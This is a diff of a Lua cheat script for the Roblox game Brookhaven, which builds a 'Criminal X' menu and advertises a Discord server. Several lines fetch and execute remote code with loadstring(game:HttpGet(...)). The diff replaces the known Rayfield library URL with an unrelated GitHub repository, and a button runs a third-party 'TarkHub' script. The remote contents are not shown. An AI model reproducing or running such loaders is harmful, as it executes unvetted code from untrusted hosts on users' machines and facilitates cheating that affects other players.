@@ -1,4 +1,4 @@
-local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+local Rayfield = loadstring(game:HttpGet('https://raw.githubusercontent.com/TheBotmaker12/Pormanbrookhaven87/main/Brookhaven'))()
 local Window = Rayfield:CreateWindow({
    Name = "Criminal X| Brookhaven",
    LoadingTitle = "The official script",
@@ -44,5 +44,20 @@ local Button = Tab:CreateButton({
       loadstring(game:HttpGet(('https://raw.githubusercontent.com/tark-w/script/main/TarkHub.lua%20(1).txt'),true))()
       
    end
+})
+
+Rayfield:Notify({
+   Title = "Criminal X| Brookhaven",
+   Content = "You have executed the script, Join the official discord https://discord.gg/criminalx",
+   Duration = 6.5,
+   Image = 4483362458,
+   Actions = { -- Notification Buttons
+      Ignore = {
+         Name = "Yessir!",
+         Callback = function()
+         print("The user tapped Okay!")
+      end
+   },
+},
 })
 
